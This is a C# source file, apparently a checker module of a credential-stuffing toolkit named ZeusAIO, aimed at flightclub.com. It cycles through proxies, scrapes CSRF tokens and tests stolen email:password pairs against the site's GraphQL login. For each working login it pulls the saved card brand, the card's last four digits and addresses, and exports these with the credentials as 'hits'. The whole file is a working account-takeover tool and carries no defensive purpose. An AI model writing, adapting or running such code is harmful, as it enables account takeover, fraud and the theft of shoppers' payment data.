using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace Flightclub
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            string getcsrf = httpRequest.Get("https://www.flightclub.com/customer/account/login", null).ToString();
                            string csrf = Check.Parse(getcsrf, "\"csrf\":\"", "\"");
                            httpRequest.AddHeader("x-csrf-token", csrf);
                            string str = "{\"operationName\":\"LoginUser\",\"variables\":{\"input\":{\"email\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}},\"query\":\"mutation LoginUser($input: LoginInput!) {  login(input: $input) {    id    fullName    email    __typename  }}\"}";
                            string strResponse = httpRequest.Post("https://www.flightclub.com/graphql", str, "application/json").ToString();
                            {
                                if (strResponse.Contains("Email or password not correct"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("fullName")) //hit
                                {
                                    httpRequest.ClearAllHeaders();
                                    httpRequest.AddHeader("x-csrf-token", csrf);
                                    string cappost = "{\"operationName\":\"getAccount\",\"variables\":{},\"query\":\"query getAccount {  user {    ...AccountPanelUser    __typename  }  shippingAddresses {    ...ShippingAddressPanelAddress    __typename  }  billingAddresses {    ...BillingAddressPanelAddress    __typename  }  creditCards {    ...PaymentPanelCreditCard    __typename  }}fragment AccountPanelUser on User {  id  fullName  email  __typename}fragment ShippingAddressPanelAddress on Address {  name  address1  address2  city  state  postalCode  country  phone {    display    __typename  }  __typename}fragment BillingAddressPanelAddress on Address {  name  address1  address2  city  state  postalCode  country  phone {    display    __typename  }  __typename}fragment PaymentPanelCreditCard on CreditCard {  last4Digits  cardBrand  __typename}\"}";
                                    string cap = httpRequest.Post("https://www.flightclub.com/graphql", cappost, "application/json").ToString();
                                    if (cap.Contains("creditCards\":[]"))
                                    {
                                        ZeusAIO.mainmenu.frees++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[FREE - FLIGHTCLUB] " + s[0] + ":" + s[1], Color.OrangeRed);
                                        }
                                        Export.AsResult("/Flightclub_frees", s[0] + ":" + s[1]);
                                        return false;

                                    }
                                    else
                                    {
                                        string type = Regex.Match(cap, "cardBrand\":(.*?),").Groups[1].Value;
                                        string last4 = Regex.Match(cap, "last4Digits\":(.*?),").Groups[1].Value;
                                        string captures = " | Payment Type: " + type + " | Last 4: " + last4;
                                        ZeusAIO.mainmenu.hits++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[HIT - FLIGHTCLUB] " + s[0] + ":" + s[1] + captures, Color.Green);
                                        }
                                        Export.AsResult("/Flightclub_hits", s[0] + ":" + s[1] + captures);
                                        return false;

                                    }


                                }
                                else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                            }
                            //break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

